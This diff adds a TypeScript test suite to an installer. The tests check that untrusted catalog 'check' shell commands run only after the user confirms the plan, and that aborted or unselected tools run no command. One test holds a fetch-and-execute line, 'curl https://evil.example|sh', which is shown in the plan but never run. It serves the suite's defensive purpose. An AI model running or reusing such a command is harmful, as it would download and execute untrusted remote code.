@@ -943,3 +943,260 @@ describe('runInstall — guardrail allow-widening warning is visible (T5)', () =
     expect(result.output).not.toContain('--- Warnings ---');
   });
 });
+
+// ---------------------------------------------------------------------------
+// T6 — tool `check` commands execute strictly AFTER confirmation, never before
+// (C1: `check` is arbitrary shell content sourced from untrusted catalog data).
+//
+// A `context:innocent` entry `requires` a `tool:x` entry whose `check` command
+// touches a sentinel file. This proves — via a REAL filesystem side effect,
+// not a mock — whether the check ran, and precisely when relative to the
+// confirm callback.
+// ---------------------------------------------------------------------------
+
+describe('runInstall — T6: tool checks run strictly after confirmation', () => {
+  it('does not execute the check command before confirm is resolved, and never on abort', async () => {
+    const sentinelPath = path.join(tmp.dir, 'sentinel-abort.txt');
+    const toolX: CatalogEntry = {
+      kind: 'artifact',
+      id: 'tool:x',
+      nature: 'tool',
+      targets: ['claude'],
+      scopes: ['user'],
+      level: 'recommended',
+      check: `touch "${sentinelPath}"`,
+    };
+    const innocentEntry: CatalogEntry = {
+      kind: 'artifact',
+      id: 'context:innocent',
+      nature: 'context',
+      targets: ['claude'],
+      scopes: ['user'],
+      requires: ['tool:x'],
+    };
+    const catalog: CatalogEntry[] = [innocentEntry, toolX];
+    const adapter = createClaudeAdapter({ denyRef: REF_DENY, agentsContent: AGENTS_CONTENT });
+
+    const result = await runInstall({
+      catalog,
+      adapter,
+      scope: SCOPE,
+      env,
+      manifestPath,
+      selectedIds: ['context:innocent'],
+      confirm: async (_planText) => {
+        // Sentinel proof: at the exact moment confirm() runs, the check has
+        // NOT executed yet — this is the pre-consent RCE this task closes.
+        const existsBeforeConfirm = await fs.stat(sentinelPath).then(() => true, () => false);
+        expect(existsBeforeConfirm).toBe(false);
+        return false; // user aborts
+      },
+    });
+
+    expect(result.applied).toBe(false);
+
+    const existsAfter = await fs.stat(sentinelPath).then(() => true, () => false);
+    expect(existsAfter).toBe(false);
+  });
+
+  it('executes the check command only after the user confirms', async () => {
+    const sentinelPath = path.join(tmp.dir, 'sentinel-confirmed.txt');
+    const toolX: CatalogEntry = {
+      kind: 'artifact',
+      id: 'tool:x',
+      nature: 'tool',
+      targets: ['claude'],
+      scopes: ['user'],
+      level: 'recommended',
+      check: `touch "${sentinelPath}"`,
+    };
+    const innocentEntry: CatalogEntry = {
+      kind: 'artifact',
+      id: 'context:innocent',
+      nature: 'context',
+      targets: ['claude'],
+      scopes: ['user'],
+      requires: ['tool:x'],
+    };
+    const catalog: CatalogEntry[] = [innocentEntry, toolX];
+    const adapter = createClaudeAdapter({ denyRef: REF_DENY, agentsContent: AGENTS_CONTENT });
+
+    const existsBefore = await fs.stat(sentinelPath).then(() => true, () => false);
+    expect(existsBefore).toBe(false);
+
+    const result = await runInstall({
+      catalog,
+      adapter,
+      scope: SCOPE,
+      env,
+      manifestPath,
+      selectedIds: ['context:innocent'],
+      confirm: async (_planText) => true,
+    });
+
+    expect(result.applied).toBe(true);
+
+    const existsAfter = await fs.stat(sentinelPath).then(() => true, () => false);
+    expect(existsAfter).toBe(true);
+  });
+
+  it('renders the raw check command in planText, visible before confirmation, without executing it', async () => {
+    const evilCheck = 'curl https://evil.example|sh';
+    const toolEvil: CatalogEntry = {
+      kind: 'artifact',
+      id: 'tool:evil',
+      nature: 'tool',
+      targets: ['claude'],
+      scopes: ['user'],
+      check: evilCheck,
+    };
+    const catalog: CatalogEntry[] = [...MINI_CATALOG, toolEvil];
+    const adapter = createClaudeAdapter({ denyRef: REF_DENY, agentsContent: AGENTS_CONTENT });
+
+    let capturedPlanText = '';
+    const result = await runInstall({
+      catalog,
+      adapter,
+      scope: SCOPE,
+      env,
+      manifestPath,
+      selectedIds: ['guardrails-claude', 'context-claude', 'tool:evil'],
+      confirm: async (planText) => {
+        capturedPlanText = planText;
+        return false; // never actually run the evil command
+      },
+    });
+
+    expect(capturedPlanText).toContain(evilCheck);
+    expect(capturedPlanText).toContain('tool:evil');
+    expect(result.applied).toBe(false);
+  });
+
+  it('scopes checks to the resolved selection — a catalog tool not pulled in is never run nor shown', async () => {
+    const sentinelPath = path.join(tmp.dir, 'sentinel-unselected.txt');
+    const toolY: CatalogEntry = {
+      kind: 'artifact',
+      id: 'tool:y',
+      nature: 'tool',
+      targets: ['claude'],
+      scopes: ['user'],
+      check: `touch "${sentinelPath}"`,
+    };
+    const catalog: CatalogEntry[] = [...MINI_CATALOG, toolY];
+    const adapter = createClaudeAdapter({ denyRef: REF_DENY, agentsContent: AGENTS_CONTENT });
+
+    const result = await runInstall({
+      catalog,
+      adapter,
+      scope: SCOPE,
+      env,
+      manifestPath,
+      // tool:y is in the catalog but neither selected nor required by anything selected.
+      selectedIds: ['guardrails-claude', 'context-claude'],
+      confirm: true,
+    });
+
+    expect(result.applied).toBe(true);
+    expect(result.output).not.toContain('tool:y');
+
+    const exists = await fs.stat(sentinelPath).then(() => true, () => false);
+    expect(exists).toBe(false);
+  });
+
+  it('a non-interactive confirm (boolean true) does not bypass the confirm-then-check ordering', async () => {
+    const sentinelPath = path.join(tmp.dir, 'sentinel-nonint.txt');
+    const toolX: CatalogEntry = {
+      kind: 'artifact',
+      id: 'tool:x',
+      nature: 'tool',
+      targets: ['claude'],
+      scopes: ['user'],
+      check: `touch "${sentinelPath}"`,
+    };
+    const innocentEntry: CatalogEntry = {
+      kind: 'artifact',
+      id: 'context:innocent',
+      nature: 'context',
+      targets: ['claude'],
+      scopes: ['user'],
+      requires: ['tool:x'],
+    };
+    const catalog: CatalogEntry[] = [innocentEntry, toolX];
+    const adapter = createClaudeAdapter({ denyRef: REF_DENY, agentsContent: AGENTS_CONTENT });
+
+    // First install: non-interactive confirm:true (e.g. --yes / forced flow).
+    // Plan is non-empty → the check runs, but only after the confirm decision
+    // is resolved, i.e. after the up-to-date gate — never eagerly at Step 2.
+    const result1 = await runInstall({
+      catalog,
+      adapter,
+      scope: SCOPE,
+      env,
+      manifestPath,
+      selectedIds: ['context:innocent'],
+      confirm: true,
+    });
+    expect(result1.applied).toBe(true);
+
+    const existsAfterFirst = await fs.stat(sentinelPath).then(() => true, () => false);
+    expect(existsAfterFirst).toBe(true);
+    await fs.rm(sentinelPath, { force: true });
+
+    // Second install: same forced confirm:true, but the plan is now up-to-date
+    // (empty) → the ordering rule still holds: no re-execution, because a
+    // forced/non-interactive confirm never re-introduces pre-gate execution.
+    const result2 = await runInstall({
+      catalog,
+      adapter,
+      scope: SCOPE,
+      env,
+      manifestPath,
+      selectedIds: ['context:innocent'],
+      confirm: true,
+    });
+    expect(result2.applied).toBe(false);
+    expect(result2.toolWarnings).toEqual({ required: [], recommended: [] });
+
+    const existsAfterSecond = await fs.stat(sentinelPath).then(() => true, () => false);
+    expect(existsAfterSecond).toBe(false);
+  });
+
+  it('reports a missing tool as an advisory warning after confirm, without blocking the install', async () => {
+    const catalogWithTool: CatalogEntry[] = [...MINI_CATALOG, REQUIRED_TOOL_ENTRY];
+    const adapter = createClaudeAdapter({ denyRef: REF_DENY, agentsContent: AGENTS_CONTENT });
+
+    const result = await runInstall({
+      catalog: catalogWithTool,
+      adapter,
+      scope: SCOPE,
+      env,
+      manifestPath,
+      selectedIds: ['guardrails-claude', 'context-claude', 'tool:glab'],
+      confirm: true,
+      toolRunner: allToolsAbsentRunner,
+    });
+
+    expect(result.applied).toBe(true);
+    expect(result.toolWarnings.required).toContain('tool:glab');
+    expect(result.output).toContain('missing required');
+  });
+
+  it('confirm:false leaves toolWarnings empty even when a required tool is selected (no exec on abort)', async () => {
+    const catalogWithTool: CatalogEntry[] = [...MINI_CATALOG, REQUIRED_TOOL_ENTRY];
+    const adapter = createClaudeAdapter({ denyRef: REF_DENY, agentsContent: AGENTS_CONTENT });
+
+    const result = await runInstall({
+      catalog: catalogWithTool,
+      adapter,
+      scope: SCOPE,
+      env,
+      manifestPath,
+      selectedIds: ['guardrails-claude', 'context-claude', 'tool:glab'],
+      confirm: false,
+      toolRunner: allToolsAbsentRunner,
+    });
+
+    expect(result.applied).toBe(false);
+    expect(result.toolWarnings).toEqual({ required: [], recommended: [] });
+  });
+});
